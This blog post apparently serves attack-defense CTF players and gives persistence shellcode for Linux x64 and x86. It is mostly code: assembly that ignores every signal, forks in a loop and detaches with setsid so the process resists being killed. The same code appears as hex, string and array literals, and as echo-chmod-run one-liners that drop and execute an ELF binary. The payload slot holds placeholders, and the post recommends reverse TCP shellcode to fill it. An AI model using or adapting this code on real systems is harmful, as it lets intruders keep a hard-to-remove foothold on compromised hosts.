---
title: How to persist shell in Attack-Defense CTF
tags: ["CTF", "PWN"]
---

## Table of Contents

- [Linux/x64](#linux-x64)
  - [Assembly](#linux-x64-assembly)
  - [Other formats](#linux-x64-other-formats)
  - [Recommended shellcode](#linux-x64-recommended-shellcode)
- [Linux/x86](#linux-x86)
  - [Assembly](#linux-x86-assembly)
  - [Other formats](#linux-x86-other-formats)
  - [Recommended shellcode](#linux-x86-recommended-shellcode)
- [References](#references)

<!-- description -->

## <a id='linux-x64'></a>Linux/x64

### <a id='linux-x64-assembly'></a>Assembly

```nasm
;// struct sigaction *action; sigemptyset(&action->sa_mask);
      xor rdx, rdx
      push 0x11
      pop rcx
sigemptyset:
      dec rcx
      push rdx
      jnz sigemptyset
;// action->sa_handler = SIG_IGN;
      push 0x1
      mov rsi, rsp
      push 0x8
      pop r10

;// for(int i=0; i<0x20; i++) signal(i, SIG_IGN);
      push 0x20
ignore:
      pop rcx
      dec rcx
      push rcx
      push rcx
      pop rdi
      push 0xd
      pop rax
      syscall
      jnz ignore

fork:
;// if (!fork()) { for(int i=-1; i==0; i--); exit(); } else { /* child */}
      push 0x39
      pop rax
      syscall
      test rax, rax
      je child
      xor ecx, ecx
sleep:
      dec ecx
      jnz sleep
      push 0x3c
      pop rax
      syscall ;// exit();

child:
;// setsid();
      push 0x70
      pop rax
      syscall

;// shellcode goes here
      int3
      int3
      int3
      int3
      int3
      int3
      int3
      int3

;// infinite loop
      ;// jmp child ;// '\xeb'+chr(256-7-len(shellcode))
      ;// jmp fork  ;// '\xeb'+chr(256-28-len(shellcode))
```

### <a id='linux-x64-other-formats'></a>Other formats:

| Format | Value |
| ------ | ----- |
| Raw Hex | 4831D26A115948FFC95275FA6A014889E66A08415A6A205948FFC951515F6A0D580F0575F26A39580F054885C0740B31C9FFC975FC6A3C580F056A70580F05[**CCCCCCCCCCCCCCCC**](#your-shellcode) |
| String Literal | \x48\x31\xD2\x6A\x11\x59\x48\xFF\xC9\x52\x75\xFA\x6A\x01\x48\x89\xE6\x6A\x08\x41\x5A\x6A\x20\x59\x48\xFF\xC9\x51\x51\x5F\x6A\x0D\x58\x0F\x05\x75\xF2\x6A\x39\x58\x0F\x05\x48\x85\xC0\x74\x0B\x31\xC9\xFF\xC9\x75\xFC\x6A\x3C\x58\x0F\x05\x6A\x70\x58\x0F\x05[**\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC**](#your-shellcode) |
| Array Literal | {0x48,0x31,0xD2,0x6A,0x11,0x59,0x48,0xFF,0xC9,0x52,0x75,0xFA,0x6A,0x01,0x48,0x89,0xE6,0x6A,0x08,0x41,0x5A,0x6A,0x20,0x59,0x48,0xFF,0xC9,0x51,0x51,0x5F,0x6A,0x0D,0x58,0x0F,0x05,0x75,0xF2,0x6A,0x39,0x58,0x0F,0x05,0x48,0x85,0xC0,0x74,0x0B,0x31,0xC9,0xFF,0xC9,0x75,0xFC,0x6A,0x3C,0x58,0x0F,0x05,0x6A,0x70,0x58,0x0F,0x05,[**0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC**](#your-shellcode)} |
| Shell Script | echo -en '\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x80\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x60\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x40\x00\x05\x00\x04\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\xc7\x00\x00\x00\x00\x00\x00\x00\xc7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x31\xd2\x6a\x11\x59\x48\xff\xc9\x52\x75\xfa\x6a\x01\x48\x89\xe6\x6a\x08\x41\x5a\x6a\x20\x59\x48\xff\xc9\x51\x51\x5f\x6a\x0d\x58\x0f\x05\x75\xf2\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0b\x31\xc9\xff\xc9\x75\xfc\x6a\x3c\x58\x0f\x05\x6a\x70\x58\x0f\x05[**\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc**](#your-shellcode)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x01\x00\x80\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\xf1\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00\x00\x00\x01\x00\x86\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x22\x00\x00\x00\x00\x00\x01\x00\x97\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00\x01\x00\xa5\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x00\x00\x00\x00\x00\x01\x00\xb1\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x00\x00\x00\x00\x01\x00\xba\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3f\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3a\x00\x00\x00\x10\x00\x01\x00\xc7\x00\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x10\x00\x01\x00\xc7\x00\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4d\x00\x00\x00\x10\x00\x01\x00\xc8\x00\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x62\x61\x64\x61\x73\x73\x2d\x6c\x69\x6e\x75\x78\x2d\x78\x36\x34\x2e\x61\x73\x6d\x00\x73\x69\x67\x65\x6d\x70\x74\x79\x73\x65\x74\x00\x69\x67\x6e\x6f\x72\x65\x00\x66\x6f\x72\x6b\x00\x73\x6c\x65\x65\x70\x00\x63\x68\x69\x6c\x64\x00\x5f\x5f\x62\x73\x73\x5f\x73\x74\x61\x72\x74\x00\x5f\x65\x64\x61\x74\x61\x00\x5f\x65\x6e\x64\x00\x00\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e\x73\x74\x72\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x80\x00\x40\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x01\x00\x00\x00\x00\x00\x00\x52\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3a\x02\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' > persist-linux-x64 && chmod +x persist-linux-x64 && ./persist-linux-x64 |

### <a id='linux-x64-recommended-shellcode'></a>Recommended shellcode:

- [Linux/x64 - Reverse TCP shell - 118 bytes ](http://shell-storm.org/shellcode/files/shellcode-857.php) *by Russell Willis*
- [How to be a badass in Attack-Defense CTF]({% post_url 2020-12-18-How-to-be-a-badass-in-Attack-Defense-CTF %}#linux-x64-assembly) *by tr3e*

## <a id='linux-x86'></a>Linux/x86

### <a id='linux-x86-assembly'></a>Assembly

```nasm
;// for(int i=0; i<0x20; i++) signal(i, SIG_IGN);
      push 0x20
ignore:
      pop ecx
      dec ecx
      push 0x1
      pop esi
      push ecx
      pop edi
      push 0x30
      pop eax
      push ecx
      int 0x80
      jnz ignore

fork:
;// if (!fork()) { for(int i=-1; i==0; i--); exit(); } else { /* child */}
      push 0x02
      pop eax
      int 0x80
      test eax, eax
      je child
      xor ecx, ecx
sleep:
      dec ecx
      jnz sleep
      push 0x1
      pop eax
      int 0x80

child:
;// setsid();
      push 0x42
      pop eax
      int 0x80

;// shellcode goes here
      int3
      int3
      int3
      int3
      int3
      int3
      int3
      int3

;// infinite loop
      ;// jmp child ;// '\xeb'+chr(256-7-len(shellcode))
      ;// jmp fork  ;// '\xeb'+chr(256-26-len(shellcode))
```

### <a id='linux-x86-other-formats'></a>Other formats:

| Format | Value |
| ------ | ----- |
| Raw Hex | 6A2059496A015E515F6A305851CD8075F16A0258CD8085C0740A31C94975FD6A0158CD806A4258CD80[**CCCCCCCCCCCCCCCC**](#your-shellcode) |
| String Literal | \x6A\x20\x59\x49\x6A\x01\x5E\x51\x5F\x6A\x30\x58\x51\xCD\x80\x75\xF1\x6A\x02\x58\xCD\x80\x85\xC0\x74\x0A\x31\xC9\x49\x75\xFD\x6A\x01\x58\xCD\x80\x6A\x42\x58\xCD\x80[**\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC**](#your-shellcode) |
| Array Literal | {0x6A,0x20,0x59,0x49,0x6A,0x01,0x5E,0x51,0x5F,0x6A,0x30,0x58,0x51,0xCD,0x80,0x75,0xF1,0x6A,0x02,0x58,0xCD,0x80,0x85,0xC0,0x74,0x0A,0x31,0xC9,0x49,0x75,0xFD,0x6A,0x01,0x58,0xCD,0x80,0x6A,0x42,0x58,0xCD,0x80,[**0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC**](#your-shellcode)} |
| Shell Script | echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xac\x01\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\x91\x00\x00\x00\x91\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6a\x20\x59\x49\x6a\x01\x5e\x51\x5f\x6a\x30\x58\x51\xcd\x80\x75\xf1\x6a\x02\x58\xcd\x80\x85\xc0\x74\x0a\x31\xc9\x49\x75\xfd\x6a\x01\x58\xcd\x80\x6a\x42\x58\xcd\x80[**\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc**](#your-shellcode)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x80\x04\x08\x00\x00\x00\x00\x03\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\xf1\xff\x16\x00\x00\x00\x62\x80\x04\x08\x00\x00\x00\x00\x00\x00\x01\x00\x1d\x00\x00\x00\x71\x80\x04\x08\x00\x00\x00\x00\x00\x00\x01\x00\x22\x00\x00\x00\x7c\x80\x04\x08\x00\x00\x00\x00\x00\x00\x01\x00\x28\x00\x00\x00\x84\x80\x04\x08\x00\x00\x00\x00\x00\x00\x01\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x2e\x00\x00\x00\x91\x90\x04\x08\x00\x00\x00\x00\x10\x00\x01\x00\x3a\x00\x00\x00\x91\x90\x04\x08\x00\x00\x00\x00\x10\x00\x01\x00\x41\x00\x00\x00\x94\x90\x04\x08\x00\x00\x00\x00\x10\x00\x01\x00\x00\x62\x61\x64\x61\x73\x73\x2d\x6c\x69\x6e\x75\x78\x2d\x78\x38\x36\x2e\x61\x73\x6d\x00\x69\x67\x6e\x6f\x72\x65\x00\x66\x6f\x72\x6b\x00\x73\x6c\x65\x65\x70\x00\x63\x68\x69\x6c\x64\x00\x5f\x5f\x62\x73\x73\x5f\x73\x74\x61\x72\x74\x00\x5f\x65\x64\x61\x74\x61\x00\x5f\x65\x6e\x64\x00\x00\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e\x73\x74\x72\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x94\x00\x00\x00\xb0\x00\x00\x00\x03\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x10\x00\x00\x00\x09\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x01\x00\x00\x46\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x01\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00' > persist-linux-x86 && chmod +x persist-linux-x86 && ./persist-linux-x86 |

### <a id='linux-x86-recommended-shellcode'></a>Recommended shellcode:

- [Linux/x86 - Shell Reverse TCP Shellcode - 72 bytes](http://shell-storm.org/shellcode/files/shellcode-833.php) *by Geyslan G. Bem*
- [How to be a badass in Attack-Defense CTF]({% post_url 2020-12-18-How-to-be-a-badass-in-Attack-Defense-CTF %}#linux-x86-assembly) *by tr3e*

## References

1. [setsid(2) - Linux man page](https://linux.die.net/man/2/setsid)
2. [w3challs syscall table](https://syscalls.w3challs.com/)
2. [Shellcodes database for study cases](http://shell-storm.org/shellcode/)